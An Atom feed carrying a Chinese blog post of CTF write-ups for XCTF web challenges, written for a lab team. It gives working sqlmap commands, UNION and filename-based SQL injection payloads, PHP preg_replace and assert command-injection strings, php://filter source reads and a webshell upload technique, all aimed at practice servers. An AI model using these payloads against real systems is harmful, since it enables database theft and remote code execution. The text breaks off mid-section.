<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xiaoZ&#39;s Blog</title>
  
  <subtitle>Try My Best</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-25T08:58:49.153Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>xiaoZ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xctf_oj_web系列WP</title>
    <link href="http://yoursite.com/2019/09/19/xctf-oj-web%E7%B3%BB%E5%88%97WP/"/>
    <id>http://yoursite.com/2019/09/19/xctf-oj-web%E7%B3%BB%E5%88%97WP/</id>
    <published>2019-09-19T12:40:51.000Z</published>
    <updated>2019-12-25T08:58:49.153Z</updated>
    
    <content type="html"><![CDATA[<h1>xctf oj web系列</h1><p>xctf上的oj对ctf新手来说，算是比较友好的，由浅入深的题目，除了有一些脑洞题外，其他基本都还算是可以的，给实验室的ctf队伍做讲解交流，也是一直推荐大家去刷一下，出了新手村，把进阶题做好，基本对于一些常见的漏洞和题型能够有了解了。趁着有时间，整理一下之前的wp，给实验室同学提供一下参考，省的到处找wp，也希望能给其他想做这个平台上题目的人一些帮助。不过，做CTF题，还是建议先自己想，自己钻研，把能想的都想透，实在没办法了再看wp,给自己一些提示，然后继续去做，做完自己尝试复现，这样才能把一道题目吃得更深更透。</p><p>这一部分主要是web方面的入门题和进阶区的第一页题，其余misc、re、pwn等方向的后续会陆续整理放出。</p><h2 id="新手区">新手区</h2><h3 id="view-source">view source</h3><p>右键查看源码，或者view-source:url，或者使用F12可查看网页源码，可得flag</p><h3 id="get-post">get post</h3><p>这题考的是HTTP的get和post请求，get可以直接作为url的param部分输入，post请求可以使用hackbar发送，或者使用burpsuite，这里建议自己尝试用python写脚本发送下请求，锻炼下coding能力。<br>这里在url输入参数&quot;a=1&quot;,再post一个&quot;b=2&quot;即可得flag。</p><h3 id="robots">robots</h3><p>考点为robots协议，这个协议主要在爬虫抓取页面时候起作用，在根目录下放一下&quot;robots.txt&quot;文件，用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取，搜索引擎中访问网站时首先要查看这个文件，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。但是，因为这些文件需要将服务器页面信息列出，所以常被攻击者利用。<br>这题访问robots.txt文件，可以看到&quot;flag_1s_h3re.php&quot;文件，访问即可得flag。<br>关于robots协议，可参考<a href="https://zh.wikipedia.org/zh-hans/Robots.txt" target="_blank" rel="noopener">维基百科</a></p><h3 id="backup">backup</h3><p>考点为文件备份，通过添加备份文件的常用后缀获取源码的备份文件，以获取网页源码，从而得到flag。</p><h3 id="cookie">cookie</h3><p>考点为cookie,在Internet web服务中，web服务器为了辨别用户身份或会话认证等目的，会创建cookie值，将数据通过哈希、加密等处理返回给用户，用户在请求时附带上该cookie，再由服务器进行处理，由此对该访客进行认证或其他操作。<br>此题可直接F12查看网络请求，或使用bursuite抓包获取flag。</p><h3 id="disabled-button">disabled button</h3><p>此题考点为HTML源码修改，F12进入网页开发者模式，可以对HTML元素进行修改，将原本button的disable属性删除或修改，即刻点击button提交，获取flag。</p><h3 id="simple-js">simple js</h3><p>考点为编码转化，阅读网页源码，对处理的js代码进行审计，发现返回值是固定的，但是在源码中有一串字符，需要将其转为字符输出，即可得flag。需要将其先由16进制转化为字符，再对应字符查找ascii码对应的字符，则可得flag。</p><h3 id="xff-referer">xff referer</h3><p>考点为http的xff和refere头，在http中，xff(X-Forwarded-For:简称XFF头)代表客户端，即HTTP的请求端的IP;Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器是从哪个页面链接过来的。此题中用burpsuite抓包添加xss和referer头即可得flag。</p><h3 id="weak-auth">weak auth</h3><p>考点为弱口令，使用burpsuite抓包爆破即可，也可自己写python脚本读取字典进行爆破</p><h3 id="webshell">webshell</h3><p>考点为一句话木马，F12发现代码中有一句话木马，eval函数会以php代码形式进行命令执行，参数为shell,故发送对应payload的post请求即可，可以使用中国菜刀连接、hackbar发post请求，或者写python代码发包。</p><h3 id="command-execution">command execution</h3><p>考点为命令执行，服务器在执行ping命令后，通过构造shell中的命令，将其余语句注入进行执行，以获取flag。<br>先用find命令搜索flag文件，再用cat命令打印即可</p><h3 id="simple-php">simple php</h3><p>考点为php代码审计，利用PHP弱类型进行绕过，PHP中的&quot;==“和”===&quot;比较的内容不同，双等号会将字符转换为相同类型比较，而三等号会同时比较字符串的值和类型，前者属于弱类型比较。此题中，两个比较都可用字母来实现。可参考<a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP弱类型</a></p><h2 id="进阶区">进阶区</h2><h3 id="baby-web">baby web</h3><p>考点为302调转，打开网页只有一个hello world，是1.php，题目hint为想想初始页面是哪个，因此用dirsearch扫描，发现只有1.php，其余index.php和<br>index.php/login都会跳转到1.php，查看中转页面的http请求即可得flag。</p><h3 id="cat">cat</h3><p>这题有点脑洞，主要考的是django调试模式和php curl。这题开启了django调试模式，通过fuzz可以发现，当输入为非法url或含有特殊符号时候，会返回<br>invaild url，另外，如果在输入框中值包含url编码，在?url=中请求大于%7F的字符都会造成Django报错（因为django使用的gbk编码中超过%F7的编码在gbk中无意义）。这里可以通过报错信息获取文件路径及文件名，再配合PHP CURL中的特性，如果将CURLOPT_SAFE_UPLOAD设置为true时，可以在请求中加上@符号传输文件绝对路径来请求文件。payload如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?url=@/opt/api/api/settings.py<span class="comment">#获取数据库名</span></span><br><span class="line">?url=@/opt/api/database.sqlite3<span class="comment">#获取数据库内容</span></span><br></pre></td></tr></table></figure><h3 id="ics-04">ics-04</h3><p>考点为重复注册，该题目提供注册、登录和找回密码功能，对每个功能进行尝试发现在注册功能中可以进行重复注册，尝试注册admin登录，登录成功但是没有flag，于是猜想是否是其他的用户名？另外，在找回密码处发现有一个sql注入漏洞，可使用sqlmap进行注入获取其users表，查看是否有其他用户。进行重复注册即可得flag。sqlmap命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://ip:port/findpwd.php"</span> --data=<span class="string">"username=1"</span> -D cetc004 -T user -C <span class="string">"username,password"</span> --dump</span><br></pre></td></tr></table></figure><h3 id="ics-05">ics-05</h3><p>考点为XFF、PHP伪协议与命令注入,可通过php://filter伪协议获取源码，再利用preg_replace函数进行命令注入，preg_replace函数进行正则表达式的搜索和替换，但是在使用/e修正符时，正则表达式会将替换串中的内容当做代码执行，会使preg_relace()将replacement参数当做PHP代码执行。另外，php代码中对server进行了判断，需要使用burpsuite进行抓包，加上XFF头发包，<br>payload和使用伪协议获取的index.php源码如下，获取到的源码是base64编码的，需要进行解码。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php  <span class="comment">#获取源码</span></span><br><span class="line">?pat=/(.*)/e&amp;rep=system(<span class="string">'ls'</span>)&amp;sub=a <span class="comment">#列出所有文件，可得到 s3chahahaDir 目录</span></span><br><span class="line">?pat=/(.*)/e&amp;rep=system(<span class="string">'ls+s3chahahaDir'</span>)&amp;sub=a <span class="comment">#查看目录下文件</span></span><br><span class="line">?pat=/(.*)/e&amp;rep=system(<span class="string">'ls+s3chahahaDir/flag'</span>)&amp;sub=a <span class="comment">#获取flag内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># index.php源码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ics-06">ics-06</h3><p>考点为bursuite爆破，对id字段进行爆破即可，当id为2333时可得flag。</p><h3 id="lottery">lottery</h3><p>考点为PHP弱类型和git泄露？题目直接给了源码可能是为了降低难度吧，通过dirsearch可以扫出有/.git文件，于是可以利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">githack</a>把源码down下来，对源码进行审计，发现在api.php中存在漏洞。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">    require_registered();</span><br><span class="line">    require_min_money(<span class="number">2</span>);</span><br><span class="line">$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">        $same_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中，需要对numbers进行判断，判断是否中奖，但是代码中并没有对用户输入进行数据类型检查，$win_numbers是随机生成的数字字符串。利用PHP弱类型比较，以&quot;1&quot;为例，和TRUE,1,&quot;1&quot;相等。 由于json支持布尔型数据，因此可以抓包改包，将numbers改为 true 进行发送，即可得奖。多次中奖后直接购买flag。payload如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"action"</span>:<span class="string">"buy"</span>,<span class="string">"numbers"</span>:[<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>,<span class="literal">true</span>]&#125;</span><br></pre></td></tr></table></figure><h3 id="NewsCenter">NewsCenter</h3><p>考点为sql注入，第一次点进去网页会报错，报错&quot;sql…&quot;，刷新以后发现是个搜索框，猜测是sql注入，输入 'and 1=1# 和 'and 0# 结果不同，说明存在sql注入，直接使用sqlmap就可得flag，这里用的是post请求，所以需要抓包存储为txt文件，使用 -r 命令读入sqlmap中进行注入。也可以自行构造payload进行注入，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r crack.txt --dbs  <span class="comment"># 查询数据库</span></span><br><span class="line">python sqlmap.py -r crack.txt -D news --dump  <span class="comment"># 拖库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 手注payload</span></span><br><span class="line">1<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()# </span></span><br><span class="line"><span class="string">1'</span> union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'secret_table'</span><span class="comment">#</span></span><br><span class="line">1<span class="string">' union select 1,2,fl4g from news.secret_table#</span></span><br></pre></td></tr></table></figure><h3 id="mfw">mfw</h3><p>考点为git泄露（Githack）、PHP代码审计和assert命令注入。扫目录发现网站.git文件，用githack下载源码，发现index.php和flag.php，但是flag.php里面的flag是空的，于是对index.php进行代码审计，看如何获取flag。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//以get方式获得一个page变量，如果没有，则设置为home</span></span><br><span class="line">           </span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"><span class="comment">//将page变量拼接成一个templates下的php文件，设置为变量file</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">        <span class="comment">//判断file中是否有" .. "，如果有则直接退出</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码中关键为assert和strpos函数，assert()函数会将括号中的字符当成代码来执行，并返回true或false。strpos()函数会返回字符串第一次出现的位置，如果没有找到则返回False。另外，这里file为用户输入的page拼接而成，而代码对于page并没有进行过滤，于是可以利用assert特性，assert函数的参数为assert(mixed $assertion[,string $description])，如果assertion是字符串，他会被assert()当做php代码执行。 所以这题中可以利用可控变量file传入恶意参数，将file_exists 闭合，然后传入需要执行的php代码，获取flag。 payload如下(注意需要进行url编码)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">') or print_r(file_get_contents('</span>templates/flag.php<span class="string">');#</span></span><br></pre></td></tr></table></figure><h3 id="Training-WWW-Robots">Training-WWW-Robots</h3><p>考点为robots协议，通过访问robots.txt获得flag存放的文件名，访问即可得flag。</p><h3 id="NaNNaNNaNNaN">NaNNaNNaNNaN</h3><p>考点为代码审计，题目提供了一个附件，发现是一段JavaScript的代码，把文件加个html后缀发现可以直接运行，但是对内部机制不熟悉乱输也得不到flag，所以需要对js代码进行审计。首先将其js代码进行美化，美化后源码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">    <span class="keyword">if</span> (e.length == <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> (e.match(<span class="regexp">/^be0f23/</span>) != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span> (e.match(<span class="regexp">/233ac/</span>) != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span> (e.match(<span class="regexp">/e98aa$/</span>) != <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span> (e.match(<span class="regexp">/c7be9/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = [<span class="string">"fl"</span>, <span class="string">"s_a"</span>, <span class="string">"i"</span>, <span class="string">"e&#125;"</span>];</span><br><span class="line">                        <span class="keyword">var</span> n = [<span class="string">"a"</span>, <span class="string">"_h0l"</span>, <span class="string">"n"</span>];</span><br><span class="line">                        <span class="keyword">var</span> r = [<span class="string">"g&#123;"</span>, <span class="string">"e"</span>, <span class="string">"_0"</span>];</span><br><span class="line">                        <span class="keyword">var</span> i = [<span class="string">"it'"</span>, <span class="string">"_"</span>, <span class="string">"n"</span>];</span><br><span class="line">                        <span class="keyword">var</span> s = [t, n, r, i];</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">13</span>; ++o) &#123;</span><br><span class="line">                            <span class="built_in">document</span>.write(s[o % <span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                            s[o % <span class="number">4</span>].splice(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'Ok'</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>由源码可得falg的生成逻辑，则直接将其提取出来运行即可的flag。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = [<span class="string">"fl"</span>, <span class="string">"s_a"</span>, <span class="string">"i"</span>, <span class="string">"e&#125;"</span>];</span><br><span class="line"><span class="keyword">var</span> n = [<span class="string">"a"</span>, <span class="string">"_h0l"</span>, <span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> r = [<span class="string">"g&#123;"</span>, <span class="string">"e"</span>, <span class="string">"_0"</span>];</span><br><span class="line"><span class="keyword">var</span> i = [<span class="string">"it'"</span>, <span class="string">"_"</span>, <span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> s = [t, n, r, i];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">13</span>; ++o) &#123;</span><br><span class="line">    <span class="built_in">document</span>.write(s[o % <span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">    s[o % <span class="number">4</span>].splice(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bug">bug</h3><p>考点为重放攻击与文件上传，页面可以创建用户、登录、修改密码、忘记密码，点击manage页发现需要admin权限，尝试sql注入和二次注入无果，在找回密码处可以使用burpsuite抓包，将用户名修改为admin即可修改admin的密码，再尝试登录，提示 “ip not allowed” ,加上xff头即可，此时点击manage，在源码中看到提示 “index.php?module=filemanage&amp;do=???” ，此时需要猜服务器的动作，由filemanage提示猜do=upload，进入upload页面。</p><p>先尝试上传php一句话木马，发现被拦截，提示是php文件，于是尝试其余php后缀，发现php5可以绕过过滤上传成功，得到flag。</p><h3 id="upload">upload</h3><p>考点为文件上传注入，登录页面后发现可以进行文件上传，于是尝试是否能上传一句话木马，修改后缀、截断、上传图片马、抓包修改type后发现都无法绕过，考虑是否存在其他漏洞？这里发现上传成功后会显示文件名，那么在文件名回显时，是否可以进行注入？这里尝试构造特定的文件名，判断是否可以注入。经测试发现可以进行sql注入，于是使用文件名来进行sql注入即可获得flag，这里需要注意回显无法返回字母，所以需要转为二进制显示，并且题目对回显长度进行了限制，可以使用substr进行分割输出。payload如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'+(select database())+'</span>.jpg <span class="comment"># 测试是否可以进行注入</span></span><br><span class="line"><span class="string">'+(selselectect conv(substr(hex(database()),1,12),16,10))+ '</span>.jpg  <span class="comment"># 获取数据库名</span></span><br><span class="line"><span class="string">'+(selselectect conv(substr(hex(database()),13,12),16,10))+ '</span>.jpg</span><br><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt table_name frofromm information_schema.tables where table_schema='</span>web_upload<span class="string">' limit 1,1)),1,12),16,10))+'</span>.jpg  <span class="comment"># 获取表名</span></span><br><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name='</span>hello_flag_is_here<span class="string">' limit 0,1)),1,12),16,10))+'</span>.jpg  <span class="comment"># 获取字段名</span></span><br><span class="line"><span class="string">'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit 0,1)),1,12),16,10))+'</span>.jpg <span class="comment"># 获取flag</span></span><br></pre></td></tr></table></figure><h3 id="FlatScience">FlatScience</h3><p>考点为sql注入和社工？题目页面内都是一些文档的链接，一顿操作并没有找到什么洞，于是扫描目录、查看robots.txt，可以看到 login.php 和 admin.php，进入login.php，发现需要进行登录，这里尝试sql注入构造万能密码登录，没什么用。查看源码发现参数debug,传参?debug=1,得到如下代码:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123; </span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>]; </span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>]; </span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>); </span><br><span class="line">         </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>); </span><br><span class="line">    <span class="keyword">if</span>($res)&#123; </span><br><span class="line">        $row = $res-&gt;fetchArray(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123; </span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>); </span><br><span class="line">            header(<span class="string">"Location: /"</span>); </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) </span><br><span class="line">highlight_file(<span class="string">'login.php'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现需要进行注入，并且这里为sqlite3，构建语句进行注入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usr=1‘ union select name,sql from sqlite_master--+&amp;pw=1</span><br></pre></td></tr></table></figure><p>发现返回的结果在set-cookies中，并且可以知道，数据库中有name、password、hint三个字段，构造语句分别查询</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usr=%27 UNION SELECT id, name from Users --+&amp;pw=chybeta <span class="comment"># 查询name</span></span><br><span class="line">usr=%27 UNION SELECT id, password from Users–+&amp;pw=chybeta  <span class="comment"># 查询password</span></span><br><span class="line">usr=%27 UNION SELECT id, hint from Users–+&amp;pw=chybeta   <span class="comment"># 查询hint</span></span><br></pre></td></tr></table></figure><p>通过sql注入查询，可以得到name为admin，但是password为一串哈希，还是无法登录，但是这里hint为&quot;my fav word in my fav paper&quot;，即需要从网页中的paper中获取密码，那么如何判断是哪篇paper？这里猜想是否paper的哈希为签名注入得到的password值，将paper爬取下来，然后使用脚本对其进哈希碰撞，碰撞成功则获取paper内容，得到flag。脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">        pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>: <span class="comment"># sql注入获得的hash值</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">                exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure><h3 id="web2">web2</h3><p>考点为php代码审计，将代码的逻辑逆过来执行一遍即可得flag。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 加密算法</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);           <span class="comment">//反转字符串</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;   </span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);  <span class="comment">//取每一个字符</span></span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;         <span class="comment">//ascii + 1</span></span><br><span class="line">        $_c=chr($__);           <span class="comment">//转字符</span></span><br><span class="line">        $_=$_.$_c;              <span class="comment">//拼接</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));    <span class="comment">//base64编码后反转字符，再使用rot13编码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//解密算法：</span></span><br><span class="line"><span class="comment">//rot13解码</span></span><br><span class="line"><span class="comment">//反转字符</span></span><br><span class="line"><span class="comment">//base64解码</span></span><br><span class="line"><span class="comment">//对于每个字符</span></span><br><span class="line"><span class="comment">//其ascii码 -1 转回字符 拼接</span></span><br><span class="line"><span class="comment">//反转字符</span></span><br><span class="line"></span><br><span class="line">$miwen = <span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line">    $a = str_rot13($miwen);</span><br><span class="line">    $a = strrev($a);</span><br><span class="line">    $a = base64_decode($a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;   </span><br><span class="line">        $_i = substr($a,$i,<span class="number">1</span>);</span><br><span class="line">        $__i = ord($_i)<span class="number">-1</span> ;</span><br><span class="line">        $_i = chr($__i);</span><br><span class="line">        $re = $re.$_i;</span><br><span class="line">    &#125;</span><br><span class="line">    $re = strrev($re);</span><br><span class="line">    <span class="keyword">echo</span> $re;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP2">PHP2</h3><p>考点为php后缀和url编码，将php文件后缀改为phps可得源码，发现需要发送id=admin即可得flag，但是这里源码中对id进行了url解码，所以需要admin进行两次url编码即可得flag（浏览器解码一轮，php代码解码一轮）。</p><h3 id="unserialize3">unserialize3</h3><p>考点为反序列化，打开题目给了一段php源码，源码中给了一个class，并且使用了wakeup方法，这里利用了php反序列化的一个漏洞，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行，所以可以对本地序列化的结果进行修改后提交即可得到flag。题目代码及payload如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span 